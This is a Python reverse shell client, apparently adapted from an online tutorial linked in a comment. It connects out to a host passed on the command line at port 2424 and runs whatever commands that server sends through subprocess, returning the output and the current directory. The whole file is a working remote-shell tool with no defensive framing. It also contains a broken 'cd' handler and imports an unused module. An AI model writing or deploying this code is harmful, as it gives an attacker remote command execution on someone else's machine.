import socket
import os
import subprocess
import sys
import hellobitch.cryptofernet as crypt

# https://www.thepythoncode.com/article/create-reverse-shell-python#:~:text=How%20to%20Create%20a%20Reverse%20Shell%20in%20Python,are%20some%20ideas%20to%20extend%20that%20code%3A%20

print(sys.argv)
SERVER_HOST = sys.argv[1]

SERVER_PORT = 2424
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase

# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

if __name__ == "__main__":
    # create the socket object
    s = socket.socket()

    # connect to the server
    s.connect((SERVER_HOST, SERVER_PORT))

    # get the current directory
    cwd = os.getcwd()
    s.send(cwd.encode(encoding='utf-8'))

    while True:
        # receive the command from the server

        command = s.recv(BUFFER_SIZE).decode()
        if not command:
            continue

        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        if command.lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(command)
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
    # close client connection
    s.close()
